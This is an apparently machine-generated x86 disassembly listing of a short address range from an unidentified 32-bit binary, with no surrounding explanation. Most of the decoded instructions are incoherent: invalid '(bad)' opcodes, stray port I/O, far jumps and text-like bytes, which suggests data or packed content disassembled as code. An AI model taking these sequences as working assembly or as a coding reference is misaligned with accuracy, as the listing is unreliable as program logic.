  4077ee:	arpl   WORD PTR [ecx+0x56],bp
  4077f1:	outs   dx,DWORD PTR ds:[esi]
  4077f2:	imul   edx,DWORD PTR [ebx+0x62],0x2e65792e
  4077f9:	ins    BYTE PTR es:[edi],dx
  4077fa:	arpl   WORD PTR [edx+0x65],sp
  4077fd:	gs imul esi,DWORD PTR cs:[eax+eiz*1+0x72],0x4465726d
  407807:	and    BYTE PTR [esi],ch
  407809:	data16 and BYTE PTR [ecx+ebp*2+0x62],dh
  40780e:	jb     0x407882
  407810:	and    BYTE PTR [edx+eiz*2],bh
  407813:	jne    0x407888
  407815:	ins    WORD PTR es:[edi],dx
  407817:	outs   dx,DWORD PTR ds:[esi]
  407818:	jo     0x407890
  40781a:	gs gs or ch,BYTE PTR gs:[esi+0x61]
  407820:	outs   dx,DWORD PTR ds:[esi]
  407821:	gs inc ecx
  407823:	dec    ebp
  407824:	jbe    0x40788f
  407826:	jne    0x407866
  407828:	jne    0x40788c
  40782a:	inc    esp
  40782b:	gs jae 0x407868
  40782e:	jbe    0x407850
  407830:	jb     0x407860
  407832:	imul   esp,DWORD PTR [ebp+0x54],0x65636f0a
  407839:	gs arpl WORD PTR gs:[ebp+0x69],bp
  40783e:	outs   dx,DWORD PTR ds:[esi]
  40783f:	inc    ebx
  407840:	mov    ebp,DWORD PTR [ebx-0x1774740c]
  407846:	pop    ebx
  407847:	in     eax,dx
  407848:	mov    ecx,DWORD PTR [ecx-0x1f94ba8e]
  40784e:	dec    eax
  40784f:	inc    ecx
  407850:	pop    ecx
  407851:	fnstsw WORD PTR [esi+0x7adb93df]
  407857:	fst    DWORD PTR [esi-0x12]
  40785a:	ins    DWORD PTR es:[edi],dx
  40785b:	jecxz  0x407843
  40785d:	pop    esi
  40785e:	shl    bl,0xf
  407861:	mov    esp,0xc8898989
  407866:	jb     0x407885
  407868:	popa   
  407869:	or     DWORD PTR [ecx+0x0],esi
  40786c:	or     cl,BYTE PTR [ebx+0x53]
  40786f:	jle    0x4078ca
  407871:	mov    es,WORD PTR [ebx-0x25]
  407874:	div    eax
  407876:	out    0x25,eax
  407878:	xchg   esi,eax
  407879:	ss in  eax,dx
  40787b:	fsub   st,st(0)
  40787d:	add    eax,0x7327a6d4
  407882:	mov    DWORD PTR [ecx-0x763df4c4],ecx
  407888:	mov    DWORD PTR [ecx-0x17171718],ecx
  40788e:	call   0xe929617b
  407893:	mov    ds:0xe3e6,al
  407898:	add    BYTE PTR [eax],al
  40789a:	add    BYTE PTR [eax],al
  40789c:	add    BYTE PTR [eax],al
  40789e:	add    BYTE PTR [ebp+0x75],dh
  4078a1:	pop    ecx
  4078a2:	lock rol BYTE PTR [eax-0x5acb28eb],cl
  4078a9:	sbb    edx,edi
  4078ab:	out    0x6d,eax
  4078ad:	mov    esi,0xf90dfb74
  4078b2:	pop    edx
  4078b3:	popa   
  4078b4:	out    0x64,al
  4078b6:	je     0x4078b4
  4078b8:	cli    
  4078b9:	jne    0x407930
  4078bb:	mov    dh,0x9d
  4078bd:	jne    0x407934
  4078bf:	aad    0xd1
  4078c1:	jne    0x407938
  4078c3:	mov    bl,BYTE PTR [ecx+0x43]
  4078c6:	fist   WORD PTR [ebx+0x64517312]
  4078cc:	sbb    eax,DWORD PTR [eax]
  4078ce:	xchg   esi,eax
  4078cf:	push   ds
  4078d0:	mov    edx,DWORD PTR [ebx]
  4078d2:	cmp    esi,DWORD PTR [ecx+0x2b]
  4078d5:	jl     0x40787c
  4078d7:	cwde   
  4078d8:	jle    0x40787d
  4078da:	jmp    0xe69e:0x5ec50075
  4078e1:	add    BYTE PTR [eax],al
  4078e3:	add    bh,ah
  4078e5:	stos   DWORD PTR es:[edi],eax
  4078e6:	cmp    ebx,DWORD PTR [eax]
  4078e8:	sub    ebp,DWORD PTR [edx]
  4078ea:	xchg   ecx,eax
  4078eb:	pop    edi
  4078ec:	inc    ecx
  4078ed:	stos   DWORD PTR es:[edi],eax
  4078ee:	idiv   ch
  4078f0:	repz test DWORD PTR cs:[edx+0x606d7f95],esp
  4078f8:	fs mov esi,0xdef384e
  4078fe:	inc    ebp
  4078ff:	xor    cl,BYTE PTR ds:0xbed203b6
  407905:	adc    bl,BYTE PTR [ebx-0x57a40000]
  40790b:	add    BYTE PTR [eax],al
  40790d:	add    al,ch
  40790f:	call   0xe92961fc
  407914:	call   0x542b6201
  407919:	lds    esi,FWORD PTR [esp+esi*2+0x74]
  40791d:	je     0x407993
  40791f:	je     0x407995
  407921:	je     0x407997
  407923:	add    DWORD PTR [ebx+0x5e6a5f02],0xffffff9b
  40792a:	sbb    al,0xe1
  40792c:	xchg   ebp,eax
  40792d:	or     bl,bl
  40792f:	data16 jae 0x407945
  407932:	fwait
  407933:	jo     0x407901
  407935:	out    0x2f,eax
  407937:	aam    0x2d
  407939:	fiadd  DWORD PTR [ecx]
  40793b:	loop   0x407989
  40793d:	add    DWORD PTR [ebx-0x1c94d055],0xffffffb3
  407944:	jae    0x901249a1
  40794a:	test   BYTE PTR [edi],ch
  40794c:	dec    edi
  40794d:	(bad)  
  40794e:	sahf   
  40794f:	mov    DWORD PTR [ecx+eax*2],eax
  407952:	mov    edi,0x249cc0f9
  407957:	shl    DWORD PTR [ebx],0xc2
  40795a:	pop    es
  40795b:	cli    
  40795c:	add    DWORD PTR [ebx-0x7c0f20ac],0xffffff83
  407963:	data16 rcl BYTE PTR [ebx+eax*4+0x0],cl
  407968:	inc    ecx
  407969:	and    DWORD PTR [edi+0x7c],ebp
  40796c:	adc    bl,dl
  40796e:	daa    
  40796f:	out    dx,al
  407970:	or     BYTE PTR [edi+0x3f],bl
  407973:	fld    QWORD PTR [edx-0x33]
  407976:	xor    dh,BYTE PTR [edx+edx*8-0x41]
  40797a:	sti    
  40797b:	pop    es
  40797c:	mov    DWORD PTR [esp+ebx*8-0x26],ebp
  407980:	add    BYTE PTR [eax],al
  407982:	add    BYTE PTR [eax+edi*4],bl
  407985:	add    BYTE PTR [eax],al
  407987:	push   DWORD PTR [ebx+0x0]
	...
  407995:	aas    
  407996:	cmc    
  407997:	data16 mov ah,0x36
  40799a:	loop   0x407944
  40799c:	fisubr WORD PTR [esi+edi*2+0x7f]
  4079a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079a1:	aad    0xb6
  4079a3:	pop    edx
  4079a4:	push   0x59
  4079a6:	shr    dl,0x32
  4079a9:	lods   al,BYTE PTR ds:[esi]
  4079aa:	lock mov eax,0xc0c0ce2
  4079b0:	or     al,0xc
  4079b2:	or     al,0xc
  4079b4:	or     al,0xc
  4079b6:	add    BYTE PTR [eax],al
  4079b8:	in     al,dx
  4079b9:	or     edx,edx
  4079bb:	mov    bl,0x0
  4079bd:	add    BYTE PTR [eax+0x5ccf0e04],dh
  4079c3:	shr    DWORD PTR [eax+0x5e],0x82
  4079c7:	mov    DWORD PTR [ecx],ebp
  4079c9:	jge    0x407a43
  4079cb:	int3   
  4079cc:	sbb    ah,BYTE PTR [eax+0x781a6d1b]
  4079d2:	dec    eax
  4079d3:	fld    TBYTE PTR [eax+eax*2]
  4079d6:	aas    
  4079d7:	in     al,dx
  4079d8:	pop    edi
  4079d9:	and    DWORD PTR [esi-0x32da2148],edi
  4079df:	xor    DWORD PTR [edx+0x0],esp
  4079e2:	add    BYTE PTR [eax+0x3c],dh
  4079e5:	add    BYTE PTR [eax],al
  4079e7:	inc    eax
  4079e8:	and    BYTE PTR [edx-0x7dfb0000],dl
  4079ee:	in     al,0xb9
  4079f0:	icebp  
  4079f1:	not    BYTE PTR [ecx+eiz*8+0x78]
  4079f5:	jb     0x4079eb
  4079f7:	nop
  4079f8:	adc    eax,0x5153db4b
  4079fd:	cdq    
  4079fe:	ins    BYTE PTR es:[edi],dx
  4079ff:	iret   
  407a00:	jl     0x4079b9
  407a02:	pop    esp
  407a03:	mov    ds:0x38000000,al
  407a08:	in     al,0x96
  407a0a:	jns    0x407a58
  407a0c:	sbb    dl,BYTE PTR [eax]
  407a0e:	cmp    edx,DWORD PTR [esi+0x9]
  407a11:	pop    ss
  407a12:	mov    ah,0xee
  407a14:	inc    edx
  407a15:	loope  0x4079a7
  407a17:	cli    
  407a18:	mov    fs,WORD PTR [ecx]
  407a1a:	sub    DWORD PTR [ebx-0x4819a048],ecx
  407a20:	inc    esi
  407a21:	stos   DWORD PTR es:[edi],eax
  407a22:	ins    BYTE PTR es:[edi],dx
  407a23:	push   es
  407a24:	add    BYTE PTR [eax],al
  407a26:	imul   esi,DWORD PTR [ebp+0xd0],0x74
  407a2d:	je     0x407aa3
  407a2f:	je     0x407aa5
  407a31:	je     0x407aa7
  407a33:	je     0x407aa9
  407a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a36:	jmp    0x407aac
  407a38:	jne    0x407aaf
  407a3a:	jne    0x407ab1
  407a3c:	jne    0x407ab3
  407a3e:	jne    0x407ab5
  407a40:	jne    0x407a42
  407a42:	add    BYTE PTR [edx+0x35],ch
  407a45:	dec    ebp
  407a46:	cli    
  407a47:	push   edx
  407a48:	add    al,0xec
  407a4a:	adc    DWORD PTR [ecx-0x5f],0x6d774280
  407a51:	and    ebp,DWORD PTR [ebp-0x5249a302]
  407a57:	xchg   ebx,esi
  407a59:	outs   dx,DWORD PTR ds:[esi]
  407a5a:	pop    ds
  407a5b:	add    BYTE PTR [eax],al
  407a5d:	mov    al,0xc7
  407a5f:	add    BYTE PTR [eax],al
  407a61:	adc    al,0xb7
  407a63:	add    BYTE PTR [eax],al
  407a65:	mov    edi,0x2ba2b012
  407a6a:	cmp    DWORD PTR ds:0x2ffb5d69,edx
  407a70:	and    BYTE PTR [ebx*2-0xd5c359e],dl
  407a77:	cmp    bh,0xaa
  407a7a:	daa    
  407a7b:	aas    
  407a7c:	pop    esi
  407a7d:	add    BYTE PTR [ebx-0x211ae74c],cl
  407a83:	mov    ecx,DWORD PTR [ebx-0x7c3b3175]
  407a89:	(bad)  
  407a8a:	jo     0x407a8d
  407a8c:	shr    DWORD PTR [edi+0xf],0xdd
  407a90:	push   es
  407a91:	jo     0x407a78
  407a93:	adc    al,0x6f
  407a95:	cwde   
  407a96:	jmp    0x407ad0
  407a98:	push   eax
  407a99:	imul   ebp,edi,0x5c1f2b5
  407a9f:	bound  ebx,QWORD PTR [edx+0x5e]
  407aa2:	jmp    0x61dda059
  407aa7:	leave  
  407aa8:	mov    cl,0x8b
  407aaa:	mov    eax,esp
  407aac:	or     DWORD PTR [ebx+0x8b8b],ecx
  407ab2:	add    BYTE PTR [eax],al
  407ab4:	add    BYTE PTR [eax],al
  407ab6:	add    BYTE PTR [eax],al
  407ab8:	add    BYTE PTR [ebx-0x3a],ah
  407abb:	ret    0x7575
  407abe:	jne    0x407b35
  407ac0:	jne    0x407b37
  407ac2:	jne    0x407b39
  407ac4:	jne    0x407aea
  407ac6:	and    al,0x33
  407ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ac9:	sar    BYTE PTR [edx+0x7cccd7a0],1
  407acf:	enter  0xe522,0xa9
  407ad3:	or     al,0xc0
  407ad5:	pop    ds
  407ad6:	fistp  QWORD PTR [edx+0x18a44cbd]
  407adc:	je     0x407ac3
  407ade:	or     DWORD PTR [esp],esp
  407ae1:	mov    ecx,0xc38607b2
  407ae6:	dec    ebx
  407ae7:	and    DWORD PTR [edx+edi*1],eax
  407aea:	inc    esp
  407aeb:	xor    eax,0x7daa3033
  407af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af1:	inc    edi
  407af2:	pop    eax
  407af3:	push   ebp
  407af4:	aad    0x54
  407af6:	out    dx,al
  407af7:	shl    BYTE PTR [edi+edi*8+0x4cebd8d],cl
  407afe:	and    al,0x24
  407b00:	(bad)  
  407b01:	or     eax,0xcd24246f
  407b06:	scas   al,BYTE PTR es:[edi]
  407b07:	pop    es
  407b08:	and    al,0xff
  407b0a:	daa    
  407b0b:	test   eax,0x243c2ab5
  407b10:	adc    BYTE PTR [ebp-0x594f5d19],bh
  407b16:	fnstenv [ecx-0xe]
  407b19:	scas   eax,DWORD PTR es:[edi]
  407b1a:	sub    BYTE PTR [edi+0xa],dl
  407b1d:	mov    DWORD PTR [eax],ebp
  407b1f:	inc    eax
  407b20:	fsubr  DWORD PTR [edx-0x1]
  407b23:	(bad)  
  407b24:	call   FWORD PTR [edi]
  407b26:	out    0xff,al
  407b28:	push   DWORD PTR [edi]
  407b2a:	out    dx,al
  407b2b:	(bad)  
  407b2c:	(bad)  
  407b2d:	(bad)  
  407b2e:	(bad)  
  407b2f:	(bad)  
  407b30:	(bad)  
  407b31:	(bad)  
  407b32:	(bad)  
  407b33:	(bad)  
  407b34:	(bad)  
  407b35:	(bad)  
  407b36:	(bad)  
  407b37:	out    dx,eax
  407b38:	push   esp
  407b39:	sub    BYTE PTR [eax+0x273f1c61],cl
  407b3f:	popf   
  407b40:	inc    ebp
  407b41:	cmp    ecx,DWORD PTR [esi]
  407b43:	mov    ds:0xf35e1beb,eax
  407b48:	or     ebx,DWORD PTR [edx]
  407b4a:	dec    ebx
  407b4b:	mov    cl,0x4e
  407b4d:	pusha  
  407b4e:	adc    DWORD PTR [ebx-0x7c7c7c7d],eax
  407b54:	add    DWORD PTR [ebx+0x4048383],0xffffffdb
  407b5b:	xchg   edx,eax
  407b5c:	adc    bh,cl
  407b5e:	add    al,0x4
  407b60:	add    ecx,DWORD PTR [ebx]
  407b62:	xchg   edi,eax
  407b63:	push   esp
  407b64:	mov    al,0x7a
  407b66:	fisubr WORD PTR [ecx]
  407b68:	ficomp DWORD PTR ds:0xba2266bd
  407b6e:	xchg   ebx,eax
  407b6f:	cli    
  407b70:	(bad)  
  407b71:	test   al,0xfe
  407b73:	cmp    bh,BYTE PTR [ecx-0x48]
  407b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b77:	cmp    BYTE PTR [ebx+eax*2+0x48],dh
  407b7b:	dec    ebx
  407b7c:	mov    DWORD PTR [ebx-0x23],ebx
  407b7f:	popf   
  407b80:	retf   0xbe64
  407b83:	add    al,0x4
  407b85:	fcmovb st,st(6)
  407b87:	add    al,0x4
  407b89:	fcomp  QWORD PTR es:[ecx]
  407b8c:	add    al,0x0
  407b8e:	or     eax,0xa7128f0f
  407b93:	push   esi
  407b94:	adc    ch,BYTE PTR [edx]
  407b96:	popa   
  407b97:	clc    
  407b98:	or     ah,BYTE PTR [ebx]
  407b9a:	push   si
  407b9c:	test   DWORD PTR [esi-0xc8d59d3],ebp
  407ba2:	dec    ecx
  407ba3:	inc    eax
  407ba4:	add    esp,ebx
  407ba6:	add    BYTE PTR [eax],al
  407ba8:	add    BYTE PTR [ebp+0x4c550ac7],cl
  407bae:	pop    ecx
  407baf:	in     al,0x34
  407bb1:	stos   DWORD PTR es:[edi],eax
  407bb2:	stos   BYTE PTR es:[edi],al
  407bb3:	jle    0x68d9c7f6
  407bb9:	call   0xd9f1c83
  407bbe:	lea    esi,[edi+0x63]
  407bc1:	jmp    0x407b57
  407bc3:	jl     0x407b66
  407bc5:	jp     0x407bc7
  407bc7:	add    BYTE PTR ds:0xf6c4,ch
  407bcd:	add    bh,bh
  407bcf:	(bad)  
  407bd0:	(bad)  
  407bd1:	(bad)  
  407bd2:	(bad)  
  407bd3:	(bad)  
  407bd4:	(bad)  
  407bd5:	(bad)  
  407bd6:	push   DWORD PTR [ebp+ebx*2+0x18]
  407bda:	(bad)  
  407bdb:	(bad)  
  407bdc:	(bad)  
  407bdd:	(bad)  
  407bde:	(bad)  
  407bdf:	(bad)  
  407be0:	(bad)  
  407be1:	(bad)  
  407be2:	inc    DWORD PTR [eax]
  407be4:	add    BYTE PTR [ecx],bh
  407be6:	jne    0x407b88
  407be8:	loop   0x407c5e
  407bea:	push   es
  407beb:	dec    edx
  407bec:	lds    eax,FWORD PTR [ebx-0x76]
  407bef:	retf   0x248
  407bf2:	inc    edi
  407bf3:	and    edx,ebp
  407bf5:	or     eax,0xe7fdb838
  407bfa:	stos   BYTE PTR es:[edi],al
  407bfb:	inc    eax
  407bfc:	and    eax,DWORD PTR [eax]
  407bfe:	add    BYTE PTR [ecx],dl
  407c00:	and    al,0x0
  407c02:	add    BYTE PTR [edx-0x3c],bl
  407c05:	add    BYTE PTR [eax],al
  407c07:	pop    ebx
  407c08:	xor    BYTE PTR [edi-0x27],cl
  407c0b:	mov    eax,ds:0x2e760ee6
  407c10:	and    cl,BYTE PTR gs:[edx]
  407c13:	ins    DWORD PTR es:[edi],dx
  407c14:	cmp    eax,0x6220693d
  407c19:	gs jb  0x407c81
  407c1c:	inc    esp
  407c1d:	data16 and BYTE PTR [ebp+0x72],ch
  407c21:	dec    ebp
  407c22:	imul   esi,DWORD PTR [edx+0x53],0x73727265
  407c29:	outs   dx,BYTE PTR ds:[esi]
  407c2a:	das    
  407c2b:	jo     0x407c9c
  407c2d:	gs cs je 0x407c92
  407c31:	and    BYTE PTR [ebp+0x6f],ch
  407c34:	gs dec ebp
  407c36:	cmp    dh,BYTE PTR [esi+0x20]
  407c39:	and    BYTE PTR gs:[ebp+eiz*2+0x61],ah
  407c3e:	gs imul ebp,DWORD PTR cs:[edi+0x6f],0x63766370
  407c47:	jbe    0x407cac
  407c49:	jae    0x407ca2
  407c4b:	gs jb  0x407c7c
  407c4e:	ins    DWORD PTR es:[edi],dx
  407c4f:	push   edi
  407c50:	and    esi,DWORD PTR [ebx+0x3c]
  407c53:	fs inc ecx
  407c55:	arpl   WORD PTR ds:[edi+ebp*1+0x62],si
  407c5a:	jb     0x407cca
  407c5c:	fs outs dx,DWORD PTR gs:[esi]
  407c5f:	jb     0x407cca
  407c61:	gs push ebx
  407c63:	ins    DWORD PTR es:[edi],dx
  407c64:	dec    ebp
  407c65:	jo     0x407cdb
  407c67:	push   ebx
  407c68:	ins    DWORD PTR es:[edi],dx
  407c69:	je     0x407cd8
  407c6b:	outs   dx,BYTE PTR ds:[esi]
  407c6c:	jo     0x407c9c
  407c6e:	jo     0x407c90
  407c70:	and    BYTE PTR [ebp+0x6d],dh
  407c73:	arpl   WORD PTR [esi+0x2e],bp
  407c76:	xor    DWORD PTR [ebp+0x6e],esp
  407c79:	outs   dx,DWORD PTR ds:[esi]
  407c7a:	arpl   WORD PTR [edi+0x61],sp
  407c7d:	cmp    al,0xa
  407c7f:	cs gs je 0x407cf5
  407c83:	outs   dx,BYTE PTR ds:[esi]
  407c84:	jo     0x407cd9
  407c86:	add    edx,DWORD PTR [esi-0x43]
  407c89:	push   0xfd9779e1
  407c8e:	xchg   esp,eax
  407c8f:	in     al,0x6f
  407c91:	xor    DWORD PTR [esi],eax
  407c93:	sub    BYTE PTR [eax],ah
  407c95:	sub    esp,DWORD PTR [edx+0x0]
  407c98:	push   eax
  407c99:	std    
  407c9a:	retf   0x6c01
  407c9d:	push   eax
  407c9e:	push   eax
  407c9f:	push   eax
  407ca0:	std    
  407ca1:	pop    es
  407ca2:	pop    ecx
  407ca3:	test   DWORD PTR [edx-0x7b727562],edx
  407ca9:	xor    al,0x3c
  407cab:	int    0xab
  407cad:	jb     0x407c9b
  407caf:	in     al,0x1d
  407cb1:	repnz les ebp,FWORD PTR [ecx+0x11]
  407cb5:	mov    ecx,0x33eb947
  407cba:	je     0x407ced
  407cbc:	mov    esp,0xcaecc5cb
  407cc1:	pop    es
  407cc2:	push   0x92af5050
  407cc7:	push   eax
  407cc8:	push   eax
  407cc9:	push   eax
	...
  407cd2:	add    BYTE PTR [ecx],bl
  407cd4:	mov    al,0xe7
  407cd6:	mov    ecx,DWORD PTR [ebx-0x74747475]
  407cdc:	mov    ecx,DWORD PTR [ebx+0x3900008b]
  407ce2:	pop    edi
  407ce3:	fisub  WORD PTR [esi]
  407ce5:	adc    eax,0x1039f4c
  407cea:	cmc    
  407ceb:	xchg   ebx,eax
  407cec:	mov    ?,WORD PTR [edi+0x15]
  407cef:	les    edx,FWORD PTR [ebx+ecx*1]
  407cf2:	sti    
  407cf3:	outs   dx,DWORD PTR ds:[esi]
  407cf4:	sub    bh,BYTE PTR [ecx]
  407cf6:	cs scas eax,DWORD PTR es:[edi]
  407cf8:	in     eax,dx
  407cf9:	add    BYTE PTR [eax],al
  407cfb:	dec    esp
  407cfc:	inc    ebp
  407cfd:	xor    al,dl
  407cff:	jbe    0x407d0f
  407d01:	push   ss
  407d02:	push   ebx
  407d03:	and    eax,0x8723d11f
  407d08:	mov    ecx,0x30785dde
  407d0d:	neg    BYTE PTR [ecx-0xa82f278]
  407d13:	sbb    al,0xc7
  407d15:	or     al,0xb9
  407d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d18:	add    BYTE PTR [eax],al
  407d1a:	scas   eax,DWORD PTR es:[edi]
  407d1b:	clc    
  407d1c:	pop    ebx
  407d1d:	add    BYTE PTR [eax],al
  407d1f:	inc    eax
  407d20:	fild   DWORD PTR [eax]
  407d23:	call   0xc799db36
  407d28:	ret    
  407d29:	jns    0x407d62
  407d2b:	int    0x68
  407d2d:	or     DWORD PTR [edx+0x6e],ecx
  407d30:	add    eax,0xbc965dd3
  407d35:	out    dx,eax
  407d36:	xchg   BYTE PTR [edx-0x6b],dl
  407d39:	or     eax,0xe8e88be8
  407d3e:	call   0xe92963c0
  407d43:	or     ah,BYTE PTR [edx]
  407d45:	call   0x416632
  407d4a:	add    BYTE PTR [eax],al
  407d4c:	add    BYTE PTR [eax],al
  407d4e:	add    BYTE PTR [eax],al
  407d50:	add    BYTE PTR [edx+0x825d92d],dl
  407d56:	stos   BYTE PTR es:[edi],al
  407d57:	enter  0xdee5,0x1a
  407d5b:	sub    al,0x1e
  407d5d:	leave  
  407d5e:	push   esp
  407d5f:	lds    ebp,FWORD PTR [edx+0x727c366e]
  407d65:	sbb    esp,ecx
  407d67:	pop    es
  407d68:	xor    DWORD PTR [eax],eax
	...
  407d72:	add    BYTE PTR [eax],al
  407d74:	adc    cl,BYTE PTR [ebp-0x6]
  407d77:	cmp    al,BYTE PTR [eax]
  407d79:	add    BYTE PTR [ebp+0x683852ac],al
  407d7f:	sbb    al,BYTE PTR [ebx]
  407d81:	cmp    eax,0x81550d26
  407d86:	adc    DWORD PTR [edi+0x10687f35],0xbcf7aaf7
  407d90:	jns    0x407de3
  407d92:	sti    
  407d93:	dec    ecx
  407d94:	ror    bl,0xd1
  407d97:	or     al,0x95
  407d99:	imul   ecx,edi,0x8d4c
  407d9f:	ins    BYTE PTR es:[edi],dx
  407da0:	jmp    0xc6:0x7b7a0000
  407da7:	add    ah,bl
  407da9:	fcmovnu st,st(3)
  407dab:	mov    DWORD PTR [ecx+0x35872387],edx
  407db1:	mov    eax,0x7feb902b
  407db6:	test   dl,bl
  407db8:	mov    eax,0x49fb996b
  407dbd:	mov    ecx,0xc727
  407dc2:	add    BYTE PTR [eax-0x64],al
  407dc5:	icebp  
  407dc6:	inc    esp
  407dc8:	mov    ds:0x220f583,al
  407dcd:	lods   eax,DWORD PTR ds:[esi]
  407dce:	pop    edi
  407dcf:	xchg   esi,eax
  407dd0:	cmp    DWORD PTR [ebx+0x55],ebp
  407dd3:	jnp    0x407daa
  407dd5:	sub    al,0xf4
  407dd7:	rol    dl,1
  407dd9:	and    al,0xd8
  407ddb:	js     0x407d9a
  407ddd:	or     esi,DWORD PTR [esi-0x53]
  407de0:	add    BYTE PTR [eax],al
  407de2:	outs   dx,DWORD PTR ds:[esi]
  407de3:	push   esp
  407de4:	jo     0x407de6
  407de6:	add    BYTE PTR [eax],al
  407de8:	int3   
  407de9:	int3   
  407dea:	int3   
  407deb:	int3   
  407dec:	int3   
  407ded:	int3   
  407dee:	int3   
  407def:	int3   
  407df0:	int3   
  407df1:	and    ebx,DWORD PTR [esi]
  407df3:	pop    esi
	...
  407dfc:	add    BYTE PTR [ebx+0x3256a98b],cl
  407e02:	lods   al,BYTE PTR ds:[esi]
  407e03:	addr16 jmp 0x407dfb
  407e06:	sub    eax,0x5efa7036
  407e0b:	scas   al,BYTE PTR es:[edi]
  407e0c:	loop   0x407dd4
  407e0e:	imul   eax,DWORD PTR [ebx+0x25],0x76
  407e12:	push   ebx
  407e13:	pop    esi
  407e14:	fdivr  QWORD PTR [esi-0x66747465]
  407e1a:	ror    DWORD PTR [ebx-0x743ff175],0x8b
  407e21:	inc    ebp
  407e22:	push   ecx
  407e23:	fnstsw WORD PTR [ecx+edi*2-0x7847cd9]
  407e2a:	icebp  
  407e2b:	gs push esi
  407e2d:	test   DWORD PTR [ecx+0x14],ecx
  407e30:	xchg   edi,eax
  407e31:	inc    ebp
  407e32:	jo     0x407ea9
  407e34:	fcomp  QWORD PTR [edi+0x14]
  407e37:	pop    esi
  407e38:	mov    ds:0xde7f008b,al
  407e3d:	cmp    DWORD PTR [eax+eax*1+0x0],0x0
  407e42:	ins    DWORD PTR es:[edi],dx
  407e43:	pop    es
  407e44:	outs   dx,DWORD PTR ds:[esi]
  407e45:	pop    esi
  407e46:	ss inc ebx
  407e48:	(bad)  ds:0xa191b8bd
  407e4e:	inc    eax
  407e4f:	std    
  407e50:	std    
  407e51:	cmc    
  407e52:	loop   0x407e3c
  407e54:	mov    bh,0x2f
  407e56:	mov    ?,WORD PTR [ebp+0x56bf62ac]
  407e5c:	stos   DWORD PTR es:[edi],eax
  407e5d:	fidiv  WORD PTR [edi+ebx*2]
  407e60:	test   ecx,ebp
  407e62:	xlat   BYTE PTR ds:[ebx]
  407e63:	xchg   edi,eax
  407e64:	jmp    0x407e66
  407e66:	add    BYTE PTR [edx+0xb],bh
	...
  407e75:	sbb    eax,0x8b8b7cf8
  407e7a:	mov    ecx,DWORD PTR [ebx-0x74747475]
  407e80:	mov    eax,DWORD PTR [ebp+0x45]
  407e83:	out    dx,al
  407e84:	inc    edx
  407e85:	mov    edi,eax
  407e87:	sub    eax,0x44f5eb2c
  407e8c:	ret    0x59f
  407e8f:	xor    eax,0x823a0069
  407e94:	call   0x85d:0x12dcb7f4
  407e9b:	inc    ebp
  407e9c:	inc    ebp
  407e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e9e:	inc    eax
  407e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea0:	sub    al,0x7e
  407ea2:	iret   
  407ea3:	pop    ebx
  407ea4:	repnz rcl BYTE PTR [esi+0x55bcdf62],0xc7
  407eac:	adc    eax,0xab1b5faa
  407eb1:	dec    ebx
  407eb2:	inc    edx
  407eb3:	je     0x407ee3
  407eb5:	jmp    0x4545:0x7eea9ae1
  407ebc:	adc    ebx,DWORD PTR [esp+ebx*8]
  407ebf:	inc    ebp
  407ec0:	inc    ebp
  407ec1:	mov    ebp,0x45c1aa
  407ec6:	or     ebx,DWORD PTR [edx+eiz*4]
  407ec9:	sahf   
  407eca:	inc    edi
  407ecb:	ret    0x3de1
  407ece:	stos   BYTE PTR es:[edi],al
  407ecf:	iret   
  407ed0:	mov    ds:0xe5ddcb21,eax
  407ed5:	mov    esp,0x62c0d2db
  407eda:	push   ss
  407edb:	in     al,dx
  407edc:	cmp    dh,BYTE PTR [eax]
  407ede:	add    BYTE PTR [eax],al
  407ee0:	add    BYTE PTR [ebx+0x5000066],al
  407ee6:	stos   DWORD PTR es:[edi],eax
	...
  407ef3:	mov    bl,0x92
  407ef5:	pop    ebp
  407ef6:	jbe    0x407e8f
  407ef8:	int3   
  407ef9:	jne    0x407eca
  407efb:	mov    ch,BYTE PTR [ebp+0x3c]
  407efe:	dec    ebp
  407eff:	cli    
  407f00:	lods   eax,DWORD PTR ds:[esi]
  407f01:	int    0x46
  407f03:	inc    ecx
  407f04:	jmp    0x9f08:0x7e210972
	...
  407f13:	add    BYTE PTR [ebp+0x334f2d85],al
  407f19:	ins    DWORD PTR es:[edi],dx
  407f1a:	test   DWORD PTR [ebp+0x5cfece16],eax
  407f20:	in     al,dx
  407f21:	out    0xa0,eax
  407f23:	adc    BYTE PTR [edi+eax*4-0x28],al
  407f27:	mov    bh,0xd5
  407f29:	aaa    
  407f2a:	add    eax,0xf26ff719
  407f2f:	pop    edi
  407f30:	push   ebp
  407f31:	xchg   edi,eax
  407f32:	inc    edx
  407f33:	loope  0x407f9f
  407f35:	jo     0x407f51
  407f37:	call   0xf617:0x4a34215e
  407f3e:	pop    edi
  407f3f:	test   DWORD PTR [ebp-0x7a7aa92a],eax
  407f45:	not    BYTE PTR [ecx+0x5f8b8506]
  407f4b:	clc    
  407f4c:	out    dx,al
  407f4d:	adc    dh,BYTE PTR [eax+0x53aaa195]
  407f53:	sub    eax,ebx
  407f55:	lods   al,BYTE PTR ds:[esi]
  407f56:	push   edi
  407f57:	pop    ecx
  407f58:	call   0x97cf06e3
  407f5d:	push   0xc849e868
  407f62:	mov    ecx,DWORD PTR [ebx+0x1766938b]
  407f68:	nop
  407f69:	test   eax,0x7dcb2586
  407f6e:	jg     0x407f9e
  407f70:	aaa    
  407f71:	test   eax,0x5107fa4b
  407f76:	in     al,0x39
  407f78:	sti    
  407f79:	repnz xor esp,DWORD PTR [esp+eax*1+0x7f16e32c]
  407f81:	les    ecx,FWORD PTR [ebx-0x6220e275]
  407f87:	mov    ecx,DWORD PTR [ebx+0x8b]
  407f8d:	add    BYTE PTR [eax],al
  407f8f:	add    BYTE PTR [eax],al
  407f91:	add    BYTE PTR [eax],al
  407f93:	ja     0x407fe0
  407f95:	fild   WORD PTR [eax]
	...
  407f9f:	(bad)  
  407fa0:	dec    DWORD PTR [edx+0x5a]
  407fa3:	ret    0xdc20
  407fa6:	xchg   edi,eax
  407fa7:	mov    dh,BYTE PTR [edi]
  407fa9:	add    al,BYTE PTR [edi+0x79]
  407fac:	push   cs
  407fad:	adc    al,bl
  407faf:	push   DWORD PTR cs:[ebx-0x143f6b41]
